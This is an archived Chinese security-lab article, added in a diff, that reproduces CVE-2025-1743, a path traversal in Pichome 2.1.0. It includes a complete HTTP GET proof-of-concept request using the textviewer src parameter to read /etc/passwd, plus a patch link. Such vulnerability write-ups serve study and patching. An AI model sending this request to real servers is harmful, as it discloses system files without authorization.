@@ -1,0 +1,147 @@
+---
+cve: "CVE-2025-1743"
+source: "gelusus/wxvl 公众号漏洞文库"
+---
+
+#  【成功复现】Pichome路径遍历漏洞 (CVE-2025-1743)  
+原创 弥天安全实验室  弥天安全实验室   2025-07-09 11:29  
+  
+#   
+  
+网安引领时代，弥天点亮未来    
+   
+  
+  
+  
+  
+  
+   
+  
+![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
+  
+  
+**0x00写在前面**  
+  
+**本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！**  
+  
+![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
+  
+  
+**0x01漏洞介绍**  
+  
+![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDQxibXcibvdcQt4ia7TDpt8GTUpibV8tEZ28pEDX9CtqJPNtq9Vffuibcia6Jsk3XwTJuBeb8JMocIPvYA/640?wx_fmt=png&from=appmsg "")  
+  
+       
+  
+Pichome是zyx0814个人开发者的一款图片与媒体文件管理功能强大的开源网盘程序。  
+  
+Pichome 2.1.0版本存在路径遍历漏洞，该漏洞源于文件/index.php?mod=textviewer的参数src会导致路径遍历。  
+  
+![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
+  
+  
+**0x02影响版本**  
+  
+Pichome==2.1.0  
+  
+![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDQxibXcibvdcQt4ia7TDpt8GTkyFQwpsGjzE5RC7HDPDfJmrOqQl1R1Rnia6Tu5WNlsBVHFybMQdWsyA/640?wx_fmt=png&from=appmsg "")  
+  
+  
+![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
+  
+  
+**0x03漏洞复现**  
+  
+1.访问漏洞环境  
+  
+![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDQxibXcibvdcQt4ia7TDpt8GTrvdXa2787CmL2NeObJBswq78QRdUSSribUU3mzSQp4RKUoA6O3lal2Q/640?wx_fmt=png&from=appmsg "")  
+  
+2.对漏洞进行复现  
+  
+   
+**POC**  
+  
+漏洞复现  
+```
+GET /index.php?mod=textviewer&src=file:///etc/passwd HTTP/1.1
+Host: 127.0.0.1
+Sec-Ch-Ua: "Not.A/Brand";v="99", "Chromium";v="136"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: zh-CN,zh;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+Connection: keep-alive
+
+```  
+  
+        通过响应，判断漏洞存在  
+  
+![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDQxibXcibvdcQt4ia7TDpt8GTibTBWVOXicgU1wzTZQ3VFS9pUakaAFBGJyqTaM6YsDZ5kBuJmTtibXzNQ/640?wx_fmt=png&from=appmsg "")  
+  
+  
+3.Yakit插件  
+测试  
+  
+![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDQxibXcibvdcQt4ia7TDpt8GToprVxDDQ1TmOJYJZ72rr5LZzNvkowuToXoba5tibAzjicTY1E7H4QUxw/640?wx_fmt=png&from=appmsg "")  
+  
+  
+![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
+  
+  
+**0x04修复建议**  
+  
+  
+目前厂商已发布升级补丁以修复漏洞，补丁获取链接：  
+  
+建议尽快升级修复漏洞，再次声明本文仅供学习使用，非法他用责任自负！                       
+```
+ https://github.com/sheratan4/cve/issues/4
+```  
+  
+  
+  
+弥天简介  
+  
+学海浩茫，予以风动，必降弥天之润！弥天安全实验室成立于2019年2月19日，主要研究安全防守溯源、威胁狩猎、漏洞复现、工具分享等不同领域。目前主要力量为民间白帽子，也是民间组织。主要以技术共享、交流等不断赋能自己，赋能安全圈，为网络安全发展贡献自己的微薄之力。  
+  
+口号 网安引领时代，弥天点亮未来  
+  
+  
+  
+![Image](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
+  
+   
+  
+  
+知识分享完了  
+  
+喜欢别忘了关注我们哦~  
+  
+学海浩茫，  
+  
+予以风动，  
+  
+必降弥天之润！  
+  
+  
+   弥  天  
+  
+安全实验室  
+  
+![Image](https://mmbiz.qpic.cn/mmbiz_jpg/MjmKb3ap0hDyTJAqicycpl7ZakwfehdOgvOqd7bOUjVTdwxpfudPLOJcLiaSZnMC7pDDdlIF4TWBWWYnD04wX7uA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
+  
+  
+  
+
+
+---
+
+> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
